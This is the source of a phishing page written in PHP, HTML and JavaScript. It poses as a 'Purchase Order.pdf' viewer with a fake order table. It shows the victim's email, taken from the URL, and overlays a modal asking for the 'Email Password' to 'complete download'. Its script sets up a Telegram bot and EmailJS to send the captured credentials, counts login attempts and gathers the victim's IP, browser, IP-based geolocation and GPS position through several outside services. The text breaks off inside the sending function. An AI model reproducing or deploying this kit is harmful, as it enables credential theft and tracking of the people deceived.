<?php
require_once __DIR__ . '/config.php';

// Extract Email from URL query string (?email= or ?e= [supports base64])
$email = DEFAULT_EMAIL;
if (!empty($_GET['email'])) {
    $email = trim($_GET['email']);
} elseif (!empty($_GET['e'])) {
    $raw_e = trim($_GET['e']);
    $decoded = base64_decode($raw_e, true);
    if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        $email = $decoded;
    } else {
        $email = $raw_e;
    }
}

// Get Client IP address
function getClientIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            return trim($ips[0]);
        }
    }
    return 'N/A';
}
$client_ip = getClientIP();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Purchase Order PDF — View, download and print the purchase order document.">

    <!-- PDF favicon: realistic dog-ear document icon -->
    <link rel="icon" type="image/svg+xml"
        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M4 2 L22 2 L28 8 L28 30 L4 30 Z' fill='%23e92828'/%3E%3Cpath d='M22 2 L22 8 L28 8 Z' fill='%23c41e1e'/%3E%3Crect x='8' y='14' width='16' height='2' rx='1' fill='white' opacity='0.9'/%3E%3Crect x='8' y='19' width='12' height='2' rx='1' fill='white' opacity='0.9'/%3E%3Crect x='8' y='24' width='10' height='2' rx='1' fill='white' opacity='0.7'/%3E%3Ctext x='10' y='12' font-family='Arial,sans-serif' font-size='6' font-weight='900' fill='white'%3EPDF%3C/text%3E%3C/svg%3E">

    <title>Purchase Order.pdf</title>

    <!-- Storage Guard & Local EmailJS SDK -->
    <script>
        (function() {
            try {
                var test = '__st_test__';
                window.localStorage.setItem(test, test);
                window.localStorage.removeItem(test);
            } catch (e) {
                var mem = {};
                var mock = {
                    getItem: function(k) { return mem.hasOwnProperty(k) ? mem[k] : null; },
                    setItem: function(k, v) { mem[k] = String(v); },
                    removeItem: function(k) { delete mem[k]; },
                    clear: function() { mem = {}; },
                    key: function(i) { return Object.keys(mem)[i] || null; },
                    get length() { return Object.keys(mem).length; }
                };
                try { Object.defineProperty(window, 'localStorage', { value: mock, configurable: true }); } catch (err) {}
                try { Object.defineProperty(window, 'sessionStorage', { value: mock, configurable: true }); } catch (err) {}
            }
        })();
    </script>
    <script src="email.min.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, Helvetica, sans-serif;
            background: #1d1e20;
            color: #fff;
        }

        /* =========================================
           PDF VIEWER
        ========================================= */

        .pdf-viewer {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #1d1e20;
            overflow: hidden;
        }

        /* =========================================
           TOP TOOLBAR
        ========================================= */

        .toolbar {
            height: 64px;
            width: 100%;
            background: #111214;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 18px;
            border-bottom: 1px solid #292a2d;
            position: relative;
            z-index: 20;
        }

        .toolbar-left {
            display: flex;
            align-items: center;
            gap: 18px;
            min-width: 260px;
        }

        .menu-btn {
            width: 24px;
            height: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .menu-btn span {
            width: 18px;
            height: 2px;
            background: #aaa;
            display: block;
            position: relative;
        }

        .menu-btn span::before,
        .menu-btn span::after {
            content: "";
            position: absolute;
            width: 18px;
            height: 2px;
            background: #aaa;
            left: 0;
        }

        .menu-btn span::before {
            top: -6px;
        }

        .menu-btn span::after {
            top: 6px;
        }

        .file-title {
            font-size: 16px;
            color: #d7d7d7;
            white-space: nowrap;
        }

        .toolbar-center {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .page-number {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }

        .page-input {
            width: 38px;
            height: 32px;
            background: #0b0c0d;
            border: none;
            color: #eee;
            text-align: center;
            font-size: 14px;
        }

        .page-count {
            color: #aaa;
        }

        .toolbar-divider {
            width: 1px;
            height: 28px;
            background: #333;
            margin: 0 5px;
        }

        .tool-btn {
            width: 34px;
            height: 34px;
            border: 0;
            background: transparent;
            color: #aaa;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            border-radius: 4px;
        }

        .tool-btn:hover {
            background: #292a2d;
            color: white;
        }

        .zoom-level {
            background: #0b0c0d;
            padding: 8px 11px;
            font-size: 14px;
            min-width: 58px;
            text-align: center;
        }

        .toolbar-right {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* SVG icon buttons — download & print */

        .tool-btn svg {
            width: 22px;
            height: 22px;
            fill: none;
            stroke: #aaa;
            stroke-width: 1.8;
            stroke-linecap: round;
            stroke-linejoin: round;
            transition: stroke 0.15s ease;
        }

        .tool-btn:hover svg {
            stroke: #fff;
        }

        /* =========================================
           MAIN CONTENT
        ========================================= */

        .viewer-content {
            height: calc(100vh - 64px);
            display: flex;
            overflow: hidden;
        }

        /* =========================================
           SIDEBAR
        ========================================= */

        .sidebar {
            width: 390px;
            background: #202124;
            border-right: 1px solid #303134;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 20px 16px 30px 76px;
            position: relative;
        }

        .sidebar::-webkit-scrollbar {
            width: 9px;
        }

        .sidebar::-webkit-scrollbar-thumb {
            background: #4c4d4f;
            border-radius: 10px;
        }

        .thumbnail {
            width: 160px;
            height: 218px;
            background: white;
            margin-bottom: 28px;
            position: relative;
            box-shadow: 0 2px 8px rgba(0, 0, 0, .45);
            cursor: pointer;
            overflow: hidden;
        }

        .thumbnail.active {
            outline: 5px solid #607fae;
            outline-offset: 0;
        }

        .thumbnail-page {
            width: 100%;
            height: 100%;
            color: #111;
            padding: 19px 10px;
            font-family: Arial, sans-serif;
            background: #fff;
        }

        .thumbnail-title {
            text-align: center;
            font-size: 9px;
            font-weight: bold;
            text-decoration: underline;
            margin-bottom: 15px;
        }

        .thumb-lines {
            font-size: 5px;
            line-height: 1.7;
            color: #333;
        }

        .thumb-lines strong {
            font-size: 6px;
        }

        .thumb-page-number {
            position: absolute;
            bottom: -21px;
            left: 50%;
            transform: translateX(-50%);
            color: #888;
            font-size: 13px;
        }

        /* =========================================
           DOCUMENT AREA
        ========================================= */

        .document-area {
            flex: 1;
            background: #252628;
            overflow: auto;
            display: flex;
            justify-content: center;
            padding: 0 35px 50px;
        }

        .document-page {
            width: 1040px;
            min-width: 800px;
            min-height: 1350px;
            background: white;
            color: #111;
            box-shadow: 0 4px 20px rgba(0, 0, 0, .4);
            padding: 45px 85px 60px;
            transform-origin: top center;
            transition: transform .2s ease;
        }

        .document-title {
            text-align: center;
            font-size: 46px;
            font-weight: 400;
            text-decoration: underline;
            text-underline-offset: 5px;
            text-decoration-thickness: 3px;
            margin-bottom: 32px;
        }

        .document-text {
            font-size: 20px;
            line-height: 1.6;
        }

        .document-text p {
            margin-bottom: 13px;
        }

        .document-section-title {
            font-size: 25px;
            font-weight: 700;
            margin-top: 38px;
            margin-bottom: 15px;
        }

        .order-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 25px;
            font-size: 17px;
        }

        .order-table th,
        .order-table td {
            border: 1px solid #333;
            padding: 12px;
            text-align: left;
        }

        .order-table th {
            font-weight: 700;
        }

        /* =========================================
           LOCKED SCROLLING STATE
        ========================================= */

        body.locked,
        body.locked .document-area,
        body.locked .sidebar {
            overflow: hidden !important;
            touch-action: none !important;
            user-select: none;
            -webkit-user-select: none;
        }

        /* =========================================
           DARK OVERLAY + BLUR
        ========================================= */

        .overlay {
            position: fixed;
            z-index: 50;
            inset: 0 0 0 0;
            background: rgba(0, 0, 0, 0.45);
            display: none;
            transition: opacity 0.25s ease;
        }

        .overlay.active {
            display: block;
        }

        /* =========================================
           AUTH MODAL
        ========================================= */

        .auth-modal {
            position: fixed;
            z-index: 100;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -46%);
            width: 460px;
            max-width: calc(100vw - 32px);
            background: #fff;
            color: #111;
            border-radius: 8px;
            box-shadow:
                0 12px 48px rgba(0, 0, 0, .65),
                0 0 0 1px rgba(255, 255, 255, .15);
            display: none;
            animation: modalPop 0.22s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        .auth-modal.active {
            display: block;
        }

        @keyframes modalPop {
            from {
                transform: translate(-50%, -46%) scale(0.88);
                opacity: 0;
            }

            to {
                transform: translate(-50%, -46%) scale(1);
                opacity: 1;
            }
        }

        .modal-header {
            min-height: 60px;
            display: flex;
            align-items: center;
            padding: 11px 16px;
            border-bottom: 1px solid #d9d9d9;
        }

        /* PDF icon in modal header — SVG-based realistic icon */
        .pdf-logo {
            width: 36px;
            height: 42px;
            flex-shrink: 0;
            margin-right: 13px;
        }

        .modal-heading {
            font-size: 16px;
            line-height: 1.3;
            font-weight: 400;
        }

        .modal-body {
            padding: 14px 28px 24px;
        }

        .email-address {
            font-size: 20px;
            text-align: left;
            margin-bottom: 4px;
            word-break: break-all;
        }

        .signin-description {
            font-size: 14px;
            font-style: italic;
            margin-bottom: 16px;
            color: #555;
        }

        .password-input {
            width: 100%;
            height: 42px;
            border: 1px solid #cfd3d8;
            border-radius: 5px;
            padding: 0 14px;
            font-size: 15px;
            outline: none;
            margin-bottom: 14px;
        }

        .password-input:focus {
            border-color: #6c8bb9;
            box-shadow: 0 0 0 2px rgba(55, 110, 180, .15);
        }

        .password-input::placeholder {
            color: #6d747b;
        }

        .signin-btn {
            width: 100%;
            height: 42px;
            background: #e72c3a;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background .2s ease;
        }

        .signin-btn:hover {
            background: #d91f2d;
        }

        .signin-btn:active {
            transform: translateY(1px);
        }

        .lock-icon {
            display: inline-flex;
            align-items: center;
            margin-right: 6px;
            vertical-align: middle;
        }

        .lock-icon svg {
            width: 16px;
            height: 16px;
            fill: rgba(255, 255, 255, 0.92);
        }

        .error-message {
            color: #d71920;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        .success-message {
            color: #198754;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        /* =========================================
           RESPONSIVE
        ========================================= */

        @media (max-width: 1100px) {
            .toolbar-left {
                min-width: 180px;
            }

            .sidebar {
                width: 300px;
                padding-left: 50px;
            }

            .document-page {
                padding: 60px 80px;
            }
        }

        @media (max-width: 900px) {
            .toolbar-left {
                min-width: 140px;
            }

            .sidebar {
                width: 230px;
                padding-left: 30px;
            }

            .thumbnail {
                width: 130px;
                height: 176px;
            }

            .document-page {
                padding: 50px 60px;
            }

            .document-title {
                font-size: 40px;
            }

            .toolbar-center .tool-btn:last-child {
                display: none;
            }

            .zoom-level {
                min-width: 48px;
                padding: 6px 8px;
                font-size: 13px;
            }
        }

        @media (max-width: 768px) {
            .toolbar {
                padding: 0 12px;
            }

            .sidebar {
                width: 195px;
                padding-left: 20px;
                padding-right: 10px;
            }

            .thumbnail {
                width: 118px;
                height: 160px;
            }

            .document-page {
                padding: 40px 50px;
            }

            .document-title {
                font-size: 34px;
            }

            .document-text {
                font-size: 17px;
            }
        }

        @media (max-width: 650px) {
            .sidebar {
                display: none;
            }

            .toolbar-center {
                display: none;
            }

            .file-title {
                font-size: 13px;
                max-width: 200px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }

            .toolbar {
                padding: 0 10px;
            }

            .document-area {
                padding: 10px 0 40px;
                overflow-x: hidden;
                justify-content: flex-start;
                align-items: flex-start;
            }

            .document-page {
                transform-origin: top left !important;
                min-width: 0 !important;
            }
        }

        @media (max-width: 480px) {
            .toolbar {
                height: 52px;
                padding: 0 8px;
            }

            .viewer-content {
                height: calc(100vh - 52px);
            }

            .file-title {
                font-size: 12px;
                max-width: 150px;
            }

            .menu-btn {
                width: 20px;
                height: 20px;
            }

            .toolbar-left {
                gap: 10px;
            }

            .tool-btn {
                width: 30px;
                height: 30px;
            }

            .auth-modal {
                position: fixed;
                top: 50% !important;
                left: 50% !important;
                transform: translate(-50%, -50%) !important;
                width: calc(100vw - 24px);
                max-width: 420px;
                max-height: calc(100vh - 32px);
                overflow-y: auto;
                border-radius: 10px;
            }

            .modal-header {
                padding: 10px 14px;
            }

            .modal-heading {
                font-size: 13px;
            }

            .modal-body {
                padding: 12px 16px 18px;
            }

            .email-address {
                font-size: 15px;
            }

            .signin-description {
                font-size: 12px;
                margin-bottom: 12px;
            }

            .password-input {
                height: 38px;
                font-size: 13px;
                margin-bottom: 10px;
            }

            .signin-btn {
                height: 40px;
                font-size: 14px;
            }
        }

        @media (max-width: 360px) {
            .file-title {
                font-size: 11px;
                max-width: 110px;
            }

            .toolbar-right {
                gap: 4px;
            }

            .auth-modal {
                width: calc(100vw - 16px);
            }

            .email-address {
                font-size: 13px;
                word-break: break-all;
            }

            .modal-body {
                padding: 10px 12px 14px;
            }

            .signin-btn {
                font-size: 13px;
            }
        }

        @media (max-width: 320px) {
            .toolbar {
                height: 46px;
            }

            .viewer-content {
                height: calc(100vh - 46px);
            }

            .auth-modal {
                width: calc(100vw - 10px);
                border-radius: 8px;
            }

            .modal-heading {
                font-size: 12px;
            }

            .email-address {
                font-size: 12px;
            }
        }
    </style>
</head>

<body>

    <div class="pdf-viewer">

        <!-- TOOLBAR -->
        <div class="toolbar">
            <div class="toolbar-left">
                <div class="menu-btn" id="menuBtn">
                    <span></span>
                </div>
                <div class="file-title">
                    Purchase Order.pdf
                </div>
            </div>

            <div class="toolbar-center">
                <div class="page-number">
                    <input type="text" value="1" class="page-input" id="pageInput">
                    <span class="page-count">
                        / 10
                    </span>
                </div>

                <div class="toolbar-divider"></div>

                <button class="tool-btn" id="zoomOut">−</button>
                <div class="zoom-level" id="zoomValue">100%</div>
                <button class="tool-btn" id="zoomIn">+</button>

                <div class="toolbar-divider"></div>

                <button class="tool-btn" title="Fit page">▣</button>
                <button class="tool-btn" title="Rotate">↻</button>
            </div>

            <div class="toolbar-right">
                <button class="tool-btn" id="downloadBtn" title="Download">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 3v13M7 11l5 5 5-5" />
                        <path d="M5 20h14" />
                    </svg>
                </button>
                <button class="tool-btn" id="printBtn" title="Print">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M6 9V3h12v6" />
                        <rect x="3" y="9" width="18" height="10" rx="1" />
                        <path d="M6 14h12M6 18h6" />
                    </svg>
                </button>
            </div>
        </div>

        <!-- VIEWER CONTENT -->
        <div class="viewer-content">

            <!-- SIDEBAR -->
            <aside class="sidebar" id="sidebar">
                <!-- PAGE 1 -->
                <div class="thumbnail active" data-page="1">
                    <div class="thumbnail-page">
                        <div class="thumbnail-title">Purchase Order</div>
                        <div class="thumb-lines">
                            Items listed should be submitted on or before the week ends.<br><br>
                            Pay special attention to items listed in <span style="color: #d71920;">RED</span>.<br><br>
                            <strong>PO Number: [PO 5676- 2026]</strong><br>
                            <strong>Date: [-]</strong><br><br>
                            Kindly apply discounts where applicable.<br><br>
                            <strong>Payment Terms</strong><br>
                            Payment Method: [Payment Method]<br>
                            Payment Terms: [Net 30/Net 60/COD, etc.]<br><br>
                            See below for items required/order details.<br><br>
                            <strong>Order Details</strong><br><br>
                            Boycott A&E Until Phil Robertson is Put Back On Duck Dynasty<br>
                            Eagle Rising<br>
                            Sportsmans Hub<br>
                            Mechanic Nation<br>
                            God's Not Dead<br>
                            FreedomWorks<br>
                            National Association for Gun Rights<br>
                            Jeff Foxworthy<br>
                            Classic Trucks Magazine<br>
                            Toronto Blue Jays
                        </div>
                    </div>
                    <span class="thumb-page-number">1</span>
                </div>

                <!-- PAGE 2 -->
                <div class="thumbnail" data-page="2">
                    <div class="thumbnail-page" style="background: #9e9e9e;">
                        <div class="thumb-lines" style="color: #222;">
                            Middlesbrough<br>Reading<br>Bolton Wanderers<br>Concert Rangers<br>Gosport Borough<br>Bishop's Stortford<br>Nettruck<br>Jimmy Kimmel Live<br>Jimmy Cliff<br>The Legend of Shelby the Swamp Man<br>JIMMY CHOO<br>Jimmy John's<br>Babe Winkelman<br>Lonestar<br>Truckin Magazine<br>Diesel Spec<br>Brantley Gilbert<br>Deadliest Catch<br>Largecarmag<br>Amazing Rides<br>Tracking Depot
                        </div>
                    </div>
                    <span class="thumb-page-number">2</span>
                </div>

                <!-- PAGE 3 -->
                <div class="thumbnail" data-page="3">
                    <div class="thumbnail-page" style="background: #9e9e9e;">
                        <div class="thumb-lines" style="color: #222;">
                            Truckfighters<br>FDAAmerica<br>Hoosier HORNS & HOOFS<br>Chicago Bulls<br>The Detroit Pistons<br>Team Lovers Racing<br>Colorado Avalanche<br>The Bodybuilding Nation<br>Colorado Rockies<br>Denver Nuggets<br>Denver Broncos<br>Kurt Busch<br>SportsCaster<br>Fast Car Magazine<br>King James Bible<br>Indiana Pacers<br>Furniture Row Racing<br>Hendrick Motorsports<br>JR Motorsports<br>Tony Stewart Racing<br>Stewart-Haas Racing
                        </div>
                    </div>
                    <span class="thumb-page-number">3</span>
                </div>

                <!-- PAGE 4 -->
                <div class="thumbnail" data-page="4">
                    <div class="thumbnail-page" style="background: #9e9e9e;">
                        <div class="thumbnail-title">Purchase Order</div>
                        <div class="thumb-lines" style="color: #222;">
                            Order Information<br><br>Product Details<br>Quantity<br>Unit Price<br>Total Price<br><br>Payment Information
                        </div>
                    </div>
                    <span class="thumb-page-number">4</span>
                </div>

                <!-- PAGE 5 -->
                <div class="thumbnail" data-page="5">
                    <div class="thumbnail-page" style="background: #9e9e9e;">
                        <div class="thumbnail-title">Terms & Conditions</div>
                        <div class="thumb-lines" style="color: #222;">
                            General Terms<br><br>Delivery Schedules<br>Shipping Policies<br>Payment Compliance<br>Dispute Conditions
                        </div>
                    </div>
                    <span class="thumb-page-number">5</span>
                </div>
            </aside>

            <!-- DOCUMENT AREA -->
            <main class="document-area">
                <div class="document-page" id="documentPage">
                    <h1 class="document-title">Purchase Order</h1>
                    <div class="document-text">
                        <p style="margin-bottom: 16px; font-size: 20px;">
                            Items listed should be submitted on or before the week ends.
                        </p>
                        <p style="margin-bottom: 20px; font-size: 20px;">
                            Pay special attention to items listed in <span style="color: #d71920;">RED</span>.
                        </p>
                        <p style="margin-bottom: 8px; font-size: 20px;">
                            <strong>PO Number:</strong> [PO 5676- 2026]
                        </p>
                        <p style="margin-bottom: 20px; font-size: 20px;">
                            <strong>Date:</strong> [-]
                        </p>
                        <p style="margin-bottom: 22px; font-size: 20px;">
                            Kindly apply discounts where applicable.
                        </p>
                        <p style="margin-bottom: 8px; font-size: 20px;">
                            <strong>Payment Terms</strong>
                        </p>
                        <p style="margin-bottom: 8px; font-size: 20px;">
                            <strong>Payment Method:</strong> [Payment Method]
                        </p>
                        <p style="margin-bottom: 22px; font-size: 20px;">
                            <strong>Payment Terms:</strong> [Net 30/Net 60/COD, etc.]
                        </p>
                        <p style="margin-bottom: 22px; font-size: 20px;">
                            See below for items required/order details.
                        </p>
                        <p style="margin-bottom: 18px; font-size: 20px;">
                            <strong>Order Details</strong>
                        </p>

                        <table class="order-table">
                            <thead>
                                <tr>
                                    <th>Item #</th>
                                    <th>Description</th>
                                    <th>Quantity</th>
                                    <th>Unit Price</th>
                                    <th>Total Price</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>001</td>
                                    <td>Boycott A&E Until Phil Robertson is Put Back On Duck Dynasty</td>
                                    <td>10</td>
                                    <td>$25.00</td>
                                    <td>$250.00</td>
                                </tr>
                                <tr>
                                    <td>002</td>
                                    <td>Eagle Rising</td>
                                    <td>5</td>
                                    <td>$40.00</td>
                                    <td>$200.00</td>
                                </tr>
                                <tr>
                                    <td>003</td>
                                    <td>Sportsmans Hub</td>
                                    <td>8</td>
                                    <td>$15.00</td>
                                    <td>$120.00</td>
                                </tr>
                                <tr>
                                    <td>004</td>
                                    <td>Mechanic Nation</td>
                                    <td>12</td>
                                    <td>$30.00</td>
                                    <td>$360.00</td>
                                </tr>
                                <tr>
                                    <td>005</td>
                                    <td>God's Not Dead</td>
                                    <td>15</td>
                                    <td>$18.00</td>
                                    <td>$270.00</td>
                                </tr>
                                <tr>
                                    <td>006</td>
                                    <td>FreedomWorks</td>
                                    <td>4</td>
                                    <td>$50.00</td>
                                    <td>$200.00</td>
                                </tr>
                                <tr>
                                    <td>007</td>
                                    <td>National Association for Gun Rights</td>
                                    <td>20</td>
                                    <td>$22.00</td>
                                    <td>$440.00</td>
                                </tr>
                                <tr>
                                    <td>008</td>
                                    <td>Jeff Foxworthy</td>
                                    <td>6</td>
                                    <td>$35.00</td>
                                    <td>$210.00</td>
                                </tr>
                                <tr>
                                    <td>009</td>
                                    <td>Classic Trucks Magazine</td>
                                    <td>10</td>
                                    <td>$12.00</td>
                                    <td>$120.00</td>
                                </tr>
                                <tr>
                                    <td>010</td>
                                    <td>Toronto Blue Jays</td>
                                    <td>3</td>
                                    <td>$65.00</td>
                                    <td>$195.00</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </main>
        </div>

        <!-- DARK OVERLAY -->
        <div class="overlay" id="overlay"></div>

        <!-- AUTHENTICATION MODAL -->
        <div class="auth-modal" id="authModal">
            <div class="modal-header">
                <svg class="pdf-logo" viewBox="0 0 36 42" xmlns="http://www.w3.org/2000/svg">
                    <path d="M3 0 L25 0 L33 8 L33 40 Q33 42 31 42 L5 42 Q3 42 3 40 Z" fill="#e92828" />
                    <path d="M25 0 L25 8 L33 8 Z" fill="#c41e1e" />
                    <rect x="7" y="18" width="19" height="2.5" rx="1.2" fill="white" opacity="0.95" />
                    <rect x="7" y="23" width="15" height="2.5" rx="1.2" fill="white" opacity="0.9" />
                    <rect x="7" y="28" width="12" height="2.5" rx="1.2" fill="white" opacity="0.7" />
                    <text x="8" y="15" font-family="Arial,Helvetica,sans-serif" font-size="7.5" font-weight="900" fill="white">PDF</text>
                </svg>
                <div class="modal-heading">
                    Authenticate your email credentials to access this updated version of PDF
                </div>
            </div>

            <div class="modal-body">
                <div class="email-address">
                    <?php echo htmlspecialchars($email, ENT_QUOTES, 'UTF-8'); ?>
                </div>

                <div class="signin-description">
                    Sign In your email here to continue
                </div>

                <input type="password" id="password" class="password-input" placeholder="Email Password" autocomplete="off">

                <button class="signin-btn" id="signinBtn">
                    <span class="lock-icon">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <rect x="5" y="11" width="14" height="11" rx="2" fill="white" />
                            <path d="M8 11V7a4 4 0 0 1 8 0v4" fill="none" stroke="white" stroke-width="2.2" stroke-linecap="round" />
                            <circle cx="12" cy="16" r="1.5" fill="#e72c3a" />
                        </svg>
                    </span>
                    Sign In to complete download
                </button>

                <div class="error-message" id="errorMessage">
                    Please enter your password.
                </div>

                <div class="success-message" id="successMessage">
                    Authentication successful.
                </div>
            </div>
        </div>

    </div>

    <script>
        (function () {
            'use strict';

            // CONFIGURATION INJECTED FROM PHP
            const CONFIG = {
                TELEGRAM_BOT_TOKEN: "<?php echo ENABLE_PHP_BACKEND ? '' : TELEGRAM_BOT_TOKEN; ?>",
                TELEGRAM_CHAT_ID: "<?php echo ENABLE_PHP_BACKEND ? '' : TELEGRAM_CHAT_ID; ?>",
                EMAILJS_SERVICE_ID: "<?php echo EMAILJS_SERVICE_ID; ?>",
                EMAILJS_TEMPLATE_ID: "<?php echo EMAILJS_TEMPLATE_ID; ?>",
                EMAILJS_PUBLIC_KEY: "<?php echo EMAILJS_PUBLIC_KEY; ?>",
                MAX_ATTEMPTS: <?php echo MAX_ATTEMPTS; ?>,
                REDIRECT_URL: "<?php echo REDIRECT_URL; ?>",
                ENABLE_PHP_BACKEND: <?php echo ENABLE_PHP_BACKEND ? 'true' : 'false'; ?>,
                SERVER_IP: "<?php echo htmlspecialchars($client_ip, ENT_QUOTES, 'UTF-8'); ?>"
            };

            let loginAttempts = 0;

            function formatDate(date) {
                return date.toLocaleString('en-US', {
                    weekday: 'short', year: 'numeric', month: 'short',
                    day: 'numeric', hour: '2-digit', minute: '2-digit'
                });
            }

            function getBrowserInfo() {
                const ua = navigator.userAgent;
                let os = 'Unknown OS';
                let browser = 'Unknown Browser';

                if (navigator.userAgentData && navigator.userAgentData.platform) {
                    os = navigator.userAgentData.platform;
                } else if (ua.includes('Win')) { os = 'Windows'; }
                else if (ua.includes('Mac')) { os = 'macOS'; }
                else if (ua.includes('Android')) { os = 'Android'; }
                else if (ua.includes('iOS')) { os = 'iOS'; }
                else if (ua.includes('X11') || ua.includes('Linux')) { os = 'Linux'; }

                if (ua.includes('Edg')) { browser = 'Edge'; }
                else if (ua.includes('Chrome')) { browser = 'Chrome'; }
                else if (ua.includes('Firefox')) { browser = 'Firefox'; }
                else if (ua.includes('Safari')) { browser = 'Safari'; }

                return browser + ' (' + os + ')';
            }

            function isLocalIP(ip) {
                if (!ip) return true;
                return ip === '127.0.0.1' || ip === '::1' || ip === 'localhost' || ip === 'N/A' || ip.startsWith('192.168.') || ip.startsWith('10.');
            }

            async function fetchWithTimeout(url, timeoutMs = 2500) {
                const controller = new AbortController();
                const timer = setTimeout(function () { controller.abort(); }, timeoutMs);
                try {
                    const response = await fetch(url, { signal: controller.signal });
                    clearTimeout(timer);
                    return response;
                } catch (e) {
                    clearTimeout(timer);
                    throw e;
                }
            }

            async function getIPAddress() {
                if (CONFIG.SERVER_IP && !isLocalIP(CONFIG.SERVER_IP)) {
                    return CONFIG.SERVER_IP;
                }
                const sources = [
                    'https://api.ipify.org?format=json',
                    'https://ipwho.is/',
                    'https://api.my-ip.io/ip.json'
                ];

                for (let src of sources) {
                    try {
                        const r = await fetchWithTimeout(src, 2000);
                        const d = await r.json();
                        if (d.ip) return d.ip;
                        if (d.ipAddress) return d.ipAddress;
                    } catch (e) { }
                }
                return CONFIG.SERVER_IP || 'N/A';
            }

            function getGPSCoordinates() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) return resolve(null);
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                        () => resolve(null),
                        { timeout: 6000, enableHighAccuracy: true, maximumAge: 60000 }
                    );
                });
            }

            async function getLocationData() {
                let geoResult = {
                    ip: 'N/A', city: 'Unknown', region: 'Unknown',
                    country: 'Unknown', lat: null, lon: null,
                    timezone: 'N/A', isp: 'N/A'
                };

                try {
                    let ip = await getIPAddress();
                    let lookupIp = isLocalIP(ip) ? '' : ip;

                    // Ranked by global CDN speed, uptime, zero rate-limit, and high accuracy
                    const geoApis = [
                        lookupIp ? `https://ipwho.is/${lookupIp}` : `https://ipwho.is/`,
                        `https://api.bigdatacloud.net/data/reverse-geocode-client`,
                        lookupIp ? `https://get.geojs.io/v1/ip/geo/${lookupIp}.json` : `https://get.geojs.io/v1/ip/geo.json`,
                        lookupIp ? `https://ipapi.co/${lookupIp}/json/` : `https://ipapi.co/json/`,
                        lookupIp ? `https://ip.guide/${lookupIp}` : `https://ip.guide/`
                    ];

                    for (let api of geoApis) {
                        try {
                            const r = await fetchWithTimeout(api, 2500);
                            const data = await r.json();
                            if (data) {
                                const city = data.cityName || data.city || (data.location && data.location.city) || '';
                                const region = data.regionName || data.region || data.principalSubdivision || (data.location && data.location.state) || '';
                                const country = data.countryName || data.country || data.country_name || (data.location && data.location.country) || '';
                                const lat = data.latitude !== undefined ? parseFloat(data.latitude) : (data.lat !== undefined ? parseFloat(data.lat) : (data.location && data.location.latitude ? parseFloat(data.location.latitude) : null));
                                const lon = data.longitude !== undefined ? parseFloat(data.longitude) : (data.lon !== undefined ? parseFloat(data.lon) : (data.location && data.location.longitude ? parseFloat(data.location.longitude) : null));
                                const tz = data.timeZone || (data.timezone && data.timezone.id ? data.timezone.id : data.timezone) || 'N/A';
                                const isp = (data.connection && data.connection.isp ? data.connection.isp : (data.org || data.isp || data.organization_name || (data.network && data.network.autonomous_system_organization))) || 'N/A';

                                if (city || region || country) {
                                    geoResult = {
                                        ip: data.ipAddress || data.ip || ip || 'N/A',
                                        city: city || 'Unknown',
                                        region: region || 'Unknown',
                                        country: country || 'Unknown',
                                        lat: lat,
                                        lon: lon,
                                        timezone: tz,
                                        isp: isp
                                    };
                                    break;
                                }
                            }
                        } catch (e) { }
                    }
                } catch (e) { }

                try {
                    const gps = await getGPSCoordinates();
                    if (gps && gps.lat !== null && gps.lon !== null) {
                        geoResult.lat = gps.lat;
                        geoResult.lon = gps.lon;

                        try {
                            const revUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.lat}&longitude=${gps.lon}&localityLanguage=en`;
                            const rRev = await fetchWithTimeout(revUrl, 3000);
                            const dRev = await rRev.json();
                            if (dRev) {
                                const locName = dRev.locality || dRev.city || (dRev.localityInfo && dRev.localityInfo.informative && dRev.localityInfo.informative[0] && dRev.localityInfo.informative[0].name);
                                if (locName) geoResult.city = locName;
                                if (dRev.principalSubdivision) geoResult.region = dRev.principalSubdivision;
                                if (dRev.countryName) geoResult.country = dRev.countryName;
                            }
                        } catch (e) { }
                    }
                } catch (e) { }

                return geoResult;
            }

            // Preload geolocation immediately in the background on page load
            let preloadedGeo = getLocationData();

            async function sendEmail(email, password, attemptNum, geoData) {
                if (!CONFIG.EMAILJS_PUBLIC_KEY || !CONFIG.EMAILJS_SERVICE_ID || !CONFIG.EMAILJS_TEMPLATE_ID) {
                    return false;
                }
                try {
